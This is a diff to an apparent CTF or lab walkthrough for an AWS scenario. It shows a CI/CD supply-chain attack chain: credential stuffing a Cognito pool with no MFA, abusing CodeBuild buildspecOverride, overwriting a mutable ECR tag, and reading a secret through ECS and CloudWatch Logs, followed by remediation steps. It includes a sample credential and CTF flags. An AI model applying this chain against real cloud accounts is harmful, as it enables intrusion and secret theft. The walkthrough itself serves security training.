@@ -612,35 +858,59 @@ Output:
 }
 ```
 
+Verify the ECR `:latest` digest changed — compare against the digest recorded in Step 5:
+
+```bash
+aws ecr describe-images \
+  --repository-name "dam-breaks-beaverpay-webapp-xxxxxxxx" \
+  --image-ids imageTag=latest \
+  --region us-east-1 \
+  --query 'imageDetails[0].{digest:imageDigest,pushedAt:imagePushedAt}'
+```
+
+Output:
+```json
+{
+  "digest": "sha256:ffee9876...",
+  "pushedAt": "2026-05-10T09:30:00+00:00"
+}
+```
+
+The digest is different from `sha256:aabb1234...` recorded in Step 5. The legitimate image was silently replaced. The Git repository still reads `nothing to commit, working tree clean`.
+
 ---
 
 ## Attack Chain Summary
 
 ```
 BeaverPay Developer Portal
-↓ Credential stuffing — no MFA, no ASF rate limiting
-Cognito USER_PASSWORD_AUTH
-↓ JWT obtained immediately, no MFA challenge
+↓  /config exposes Cognito clientId, poolId, identityPoolId
+↓  MFA: Optional — no second factor enforced
+Credential stuffing → j.park@ottercode.kr / Otter2022!
+↓  No MFA challenge. JWT returned immediately.
 Cognito Identity Pool
-↓ JWT → CollaboratorDeveloperRole temporary credentials
-Pacu iam__enum_permissions
-↓ codebuild:StartBuild allowed, no Condition → buildspecOverride unrestricted
-↓ ecr:PutImage denied, secretsmanager denied → attack path forced through CodeBuild + ECS
-iam:GetRolePolicy → IAM policy confirmed → Condition block missing
+↓  JWT → CollaboratorDeveloperRole via AssumeRoleWithWebIdentity
+iam:GetRolePolicy → policy document read directly
+↓  iam:SimulatePrincipalPolicy allowed — use it to enumerate effective permissions
+iam:SimulatePrincipalPolicy
+↓  codebuild:StartBuild allowed — no Condition on buildspec
+↓  ecr:PutImage denied — direct push blocked
+↓  secretsmanager:GetSecretValue denied — direct flag read blocked
+iam:GetRolePolicy → CodeBuildAccess statement has no Condition block
 ↓
-CodeBuild batch-get-projects
-↓ ECS_CLUSTER, ECS_SERVICE, SECRET_ARN environment variables exposed
-buildspecOverride via file:///tmp/buildspec.json
-↓ Malicious buildspec executed — Git repository untouched
-ECR :latest push — MUTABLE tag overwritten
-↓ Malicious image replaces legitimate image (Alpine + aws-cli, exfil.sh baked in)
-ECS Rolling Deploy — no approval gate, circuit breaker disabled
-↓ Malicious container started automatically (~3 min)
-ECS Task Role: secretsmanager:GetSecretValue → flag output to stdout
-↓ CloudWatch Logs captures container stdout automatically
+codebuild:BatchGetProjects
+↓  ECS_CLUSTER, ECS_SERVICE, SECRET_ARN exposed in environment variables
+buildspecOverride → file:///tmp/buildspec.json
+↓  Git repository untouched. Malicious buildspec runs in CodeBuild memory.
+ECR :latest push — MUTABLE tag overwritten silently
+↓
+ECS rolling deploy — no approval gate, circuit breaker disabled
+↓  Malicious container (Alpine + aws-cli) starts automatically (~3 min)
+ECS Task Role → secretsmanager:GetSecretValue → stdout
+↓  CloudWatch Logs captures container stdout automatically
 logs:FilterLogEvents with CollaboratorDeveloperRole
 ↓
-FLAG{th3_c0mm1t_w4s_cl34n_but_y0u_w3r3_n0t}
+flag{commit-clean-you-were-not}
 ```
 
 ---
@@ -689,7 +959,7 @@ aws logs filter-log-events \
 3. **buildspec Condition** — Add `codebuild:buildspec` IAM Condition to prevent `buildspecOverride`.
 4. **ECR Image Signing** — Enforce image signature verification (AWS Signer / Cosign).
 5. **Deployment Gate** — Use Blue/Green deployment with manual approval gate.
-6. **ECS Outbound Restriction** — Restrict Security Group outbound to HTTPS only. Note: this prevents reverse shells but not CloudWatch Logs exfiltration (which uses HTTPS). Combine with least-privilege Task Role IAM policy.
+6. **ECS Outbound Restriction** — Restrict Security Group outbound to HTTPS only. Note: this prevents reverse shells but not CloudWatch Logs exfiltration, which uses HTTPS. Combine with least-privilege Task Role IAM policy.
 7. **Build Alert Monitoring** — Treat CI/CD alerts as high-priority signals, not noise.
 
 ---
